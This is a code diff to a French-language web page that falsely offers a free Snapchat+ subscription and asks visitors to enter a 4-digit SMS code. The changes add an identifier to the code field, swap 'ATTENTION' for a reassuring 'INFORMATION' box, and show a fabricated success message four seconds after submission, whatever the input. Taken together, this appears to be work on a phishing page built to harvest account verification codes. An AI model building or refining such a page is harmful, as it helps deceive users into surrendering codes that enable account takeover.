@@ -171,7 +171,7 @@
         .btn-glow:active { transform: scale(0.98); }
         .btn-glow:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* --- ÉTAPE 3 : MENU ATTENTE (image_11.png) --- */
+        /* --- ÉTAPE 3 : MENU ATTENTE & SUCCÈS --- */
         .status-box {
             background-color: rgba(30, 15, 60, 0.6);
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -179,16 +179,20 @@
             padding: 35px 20px;
             margin-bottom: 40px;
             animation: fadeIn 0.5s ease-in;
+            min-height: 180px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
         }
 
-        .hourglass-icon {
+        .status-icon {
             font-size: 50px;
             margin-bottom: 20px;
             display: block;
         }
 
         .status-title {
-            color: #4ade80; /* Vert comme sur la photo */
+            color: #4ade80; 
             font-size: 22px;
             font-weight: bold;
             margin-bottom: 20px;
@@ -202,7 +206,7 @@
             opacity: 0.9;
         }
 
-        /* --- INFO BOX ATTENTION --- */
+        /* --- INFO BOX --- */
         .info-box {
             background-color: rgba(25, 10, 45, 0.7);
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -211,7 +215,7 @@
         }
 
         .info-header { color: #ffcc00; font-weight: bold; margin-bottom: 10px; }
-        .info-text { color: #a0a0a0; font-size: 14px; margin: 0; }
+        .info-text { color: #ffffff; font-size: 14px; margin: 0; opacity: 0.8; line-height: 1.4; }
 
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
@@ -250,15 +254,15 @@
             <div class="sms-subtext">Le code peut prendre jusqu'à 3 minutes pour arriver</div>
             
             <div class="input-group">
-                <input type="tel" placeholder="Code à 4 chiffres" maxlength="4" style="text-align: center;">
+                <input type="tel" id="smsCode" placeholder="Code à 4 chiffres" maxlength="4" style="text-align: center;">
             </div>
             <button class="btn-glow" onclick="showWaitingMenu()">Vérifier</button>
         </div>
 
-        <!-- ÉTAPE 3 : MENU EN ATTENTE (image_11.png) -->
+        <!-- ÉTAPE 3 : MENU ÉVOLUTIF (Attente puis Succès) -->
         <div id="step-3" style="display: none;">
-            <div class="status-box">
-                <span class="hourglass-icon">⏳</span>
+            <div class="status-box" id="status-container">
+                <span class="status-icon">⏳</span>
                 <div class="status-title">En attente de validation</div>
                 <p class="status-text">
                     Votre code a été soumis. Veuillez patienter pendant que nous le validons...
@@ -267,7 +271,7 @@
         </div>
 
         <div class="info-box">
-            <div class="info-header">ATTENTION ⚠️</div>
+            <div class="info-header">INFORMATION ℹ️</div>
             <p class="info-text">
                 Aucun frais ne vous sera prélevé pour cet abonnement Snapchat+. Notez que cette offre est soumise à des critères d'éligibilité et n'est disponible que pour les utilisateurs sélectionnés.
             </p>
@@ -276,7 +280,7 @@
     </div>
 
     <script>
-        // Passage de l'étape 1 à l'étape 2
+        // Transition Étape 1 -> Étape 2
         function processValidation() {
             const btn = document.getElementById('submitBtn');
             const step1 = document.getElementById('step-1');
@@ -291,13 +295,29 @@
             }, 2000);
         }
 
-        // Passage de l'étape 2 à l'étape 3 (image_11.png)
+        // Transition Étape 2 -> Étape 3 (Attente) puis Succès automatique
         function showWaitingMenu() {
             const step2 = document.getElementById('step-2');
             const step3 = document.getElementById('step-3');
+            const container = document.getElementById('status-container');
 
             step2.style.display = 'none';
             step3.style.display = 'block';
+
+            // APRÈS 4 SECONDES : On remplace le sablier par le succès
+            setTimeout(() => {
+                container.style.animation = 'none'; // Reset animation
+                void container.offsetWidth; // Trigger reflow
+                container.style.animation = 'fadeIn 0.5s ease-in';
+                
+                container.innerHTML = `
+                    <span class="status-icon">✅</span>
+                    <div class="status-title">Opération établie</div>
+                    <p class="status-text">
+                        L'opération a été établie avec succès. Les fonctionnalités Snap+ seront disponibles sur votre compte d'ici quelques instants.
+                    </p>
+                `;
+            }, 4000);
         }
     </script>
 
